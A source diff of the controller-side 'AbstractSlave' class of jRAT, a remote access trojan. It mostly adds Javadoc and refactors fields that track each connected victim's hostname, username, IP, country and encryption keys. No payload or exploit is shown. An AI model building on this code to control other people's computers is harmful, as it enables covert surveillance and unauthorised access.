@@ -40,44 +40,149 @@ import com.redpois0n.oslib.OperatingSystem;
 
 public abstract class AbstractSlave implements Runnable {
 	
+	/**
+	 * Unique random assigned ID for this client, between 0 and {@link Integer#MAX_VALUE}
+	 */
 	protected final int uniqueId = new Random().nextInt(Integer.MAX_VALUE);
 	
+	/**
+	 * If this client has been added to the main table, prevents repeatedly sending authentication packet and duplicating over and over
+	 */
 	protected boolean added;
 	
+	/**
+	 * The server listener that accepted the connection
+	 */
 	protected ServerListener connection;
+	
+	/**
+	 * Socket for this client
+	 */
 	protected Socket socket;
 
-	protected CountingInputStream inputStream;
-	protected CountingOutputStream outputStream;
-	protected DataOutputStream dos;
+	/**
+	 * CountingInputStream for {@link #socket}, used for measuring network usage
+	 */
+	private CountingInputStream inputStream;
+	
+	/**
+	 * CountingOutputStream for {@link #socket}, used for measuring network usage
+	 */
+	private CountingOutputStream outputStream;
+
+	/**
+	 * DataInputStream for {@link #socket} wrapped around {@link #inputStream}
+	 */
 	protected DataInputStream dis;
 	
-	protected String hostname;
+	/**
+	 * DataOutputStream for {@link #socket} wrapped around {@link #outputStream}
+	 */
+	protected DataOutputStream dos;
+	
+	/**
+	 * ID for this client if renamed
+	 */
 	protected String renamedid;
-	protected String localip;	
+	
+	/**
+	 * LAN address
+	 */
+	protected String localip;
+	
+	/**
+	 * 2 char country code retrieved using {@link se.jrat.controller.ip2c.IP2Country}
+	 */
 	protected String country;
+	
+	/**
+	 * Public Key retrieved when exchanging {@link #key}
+	 */
 	protected PublicKey rsaKey;
+	
+	/**
+	 * Randomly generated encryption key with length {@link se.jrat.common.crypto.Crypto#KEY_LENGTH}
+	 */
 	protected byte[] key;
+	
+	/**
+	 * Randomly generated encryption initialization vector with length {@link se.jrat.common.crypto.Crypto#IV_LENGTH}
+	 */
 	protected byte[] iv;
-	protected boolean responded;
-	protected boolean verified;
-	protected boolean checked;
+	
+	/**
+	 * If client has authenticated
+	 */
+	protected boolean authed;
+		
+	/**
+	 * If client is selected in {@link se.jrat.controller.ui.panels.PanelMainClients} and/or the web interface
+	 */
 	protected boolean selected;
+	
+	/**
+	 * If this client is running on a headless system
+	 */
 	protected boolean headless;
-	protected boolean lock;
+	
+	/**
+	 * Time last ping packet was sent specified by {@link System#currentTimeMillis()}
+	 */
 	protected long pingms = 0;
-	protected long sent = 0;
-	protected long received = 0;
+	
+	/**
+	 * Current ping in milliseconds
+	 */
 	protected int ping = 0;
+	
+	/**
+	 * Current status code
+	 */
 	protected int status;
+	
+	/**
+	 * Bytes of RAM
+	 */
 	protected long memory;
+	
+	/**
+	 * Client ID specified when built
+	 */
 	protected String id;
+	
+	/**
+	 * Hostname, environment variable "COMPUTERNAME" on Windows or "hostname" on *nix
+	 */
+	protected String hostname;
+	
+	/**
+	 * Computer username defined by property "user.name"
+	 */
 	protected String username;
+	
+	/**
+	 * Cached thumbnail icon
+	 */
 	protected ImageIcon thumbnail;
+	
+	/**
+	 * jRAT version of client defined by {@link se.jrat.common.Version#getVersion()}
+	 */
 	protected String version;
+	
+	/**
+	 * Operating System used by client
+	 */
 	protected AbstractOperatingSystem os;
 
+	/**
+	 * IP address + port used by client in format "IP / PORT"
+	 */
 	private String ip;
+	
+	/**
+	 * Hostname of client
+	 */
 	private String host;
 
 	public AbstractSlave(ServerListener connection, Socket socket) {		
@@ -177,10 +282,24 @@ public abstract class AbstractSlave implements Runnable {
 		return s;
 	}
 	
+	/**
+	 * @return If client is connected
+	 */
 	public boolean isConnected() {
 		return socket.isConnected() && !socket.isClosed();
 	}
 	
+	/**
+	 * Disconnect client without reason
+	 */
+	public void disconnect() {
+		this.disconnect(new Exception("Disconnect requested"));
+	}
+	
+	/**
+	 * Disconnect client
+	 * @param ex Reason for disconnection
+	 */
 	public void disconnect(Exception ex) {
 		String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();
 
@@ -195,18 +314,33 @@ public abstract class AbstractSlave implements Runnable {
 		TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
 		PluginEventHandler.onDisconnect(this);
 	}
-		
-	public abstract String getDisplayName();
 
-	public abstract void ping() throws Exception;
+	/**
+	 * Save current time in {@link #pingms} variable and send ping packet
+	 * @throws Exception
+	 */
+	protected abstract void ping() throws Exception;
 	
-	public abstract String getFileSeparator();
+	/**
+	 * Gets the file path separator
+	 * @return If running Windows \, if running any other system /
+	 */
+	public String getFileSeparator() {
+		if (getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+			return "\\";
+		} else {
+			return "/";
+		}
+	}
 
+	/**
+	 * Saves current time in {@link #pingms} variable and calls {@link #ping()}
+	 * @throws Exception
+	 */
 	public void beginPing() throws Exception {
 		pingms = System.currentTimeMillis();
 		ping();
 	}
-	
 
 	public ServerListener getConnection() {
 		return connection;
@@ -375,10 +509,14 @@ public abstract class AbstractSlave implements Runnable {
 		return country.toUpperCase();
 	}
 
-	public boolean isVerified() {
-		return verified;
+	public boolean isAuthenticated() {
+		return authed;
 	}
 
+	public void setAuthenticated(boolean b) {
+		this.authed = b;
+	}
+	
 	public String getVersion() {
 		return version;
 	}
@@ -389,10 +527,6 @@ public abstract class AbstractSlave implements Runnable {
 
 	public boolean isUpToDate() {
 		return getVersion().equals(Version.getVersion());
-	}
-
-	public void setVerified(boolean verified) {
-		this.verified = verified;
 	}
 	
 	public ImageIcon getFlag() {
@@ -425,7 +559,7 @@ public abstract class AbstractSlave implements Runnable {
 	 * Formats a display string for this client from username and hostname
 	 * @return If operating system is Windows, returns "Host\User", if *nix, user@host
 	 */
-	public String formatUserString() {
+	public String getDisplayName() {
 		String username = this.getUsername();
 		String computerName = this.getHostname();
 		
@@ -489,7 +623,12 @@ public abstract class AbstractSlave implements Runnable {
 		this.headless = headless;
 	}
 	
-	public static AbstractSlave getFromId(long id) {
+	/**
+	 * Searches connected clients from {@link #uniqueId}
+	 * @param id
+	 * @return the client found with the ID, or null if nothing found
+	 */
+	public static AbstractSlave getFromId(int id) {
 		for (AbstractSlave slave : Main.connections) {
 			if (slave.getUniqueId() == id) {
 				return slave;
